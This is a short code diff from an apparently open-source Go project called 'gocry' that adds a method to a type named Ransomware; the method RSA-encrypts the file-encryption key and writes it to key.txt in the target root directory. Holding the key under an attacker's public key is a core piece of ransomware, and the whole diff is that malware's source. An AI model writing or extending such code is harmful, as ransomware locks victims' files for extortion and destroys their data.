@@ -7,6 +7,7 @@ import (
 	"os"
 	"strings"
 
+	"github.com/nireo/gocry/crypt"
 	"github.com/nireo/gocry/utils"
 )
 
@@ -69,6 +70,19 @@ func checkIfEncrypted(path string) bool {
 	}
 
 	return false
+}
+
+func (rw *Ransomware) WriteKeyFile() error {
+	rsaEncryptedKey, err := crypt.EncryptKey(rw.Key)
+	if err != nil {
+		return err
+	}
+
+	if err := ioutil.WriteFile(rw.RootDir+"/key.txt", rsaEncryptedKey, 0600); err != nil {
+		return err
+	}
+
+	return nil
 }
 
 func NewRansomware(toEncrypt string) (*Ransomware, error) {
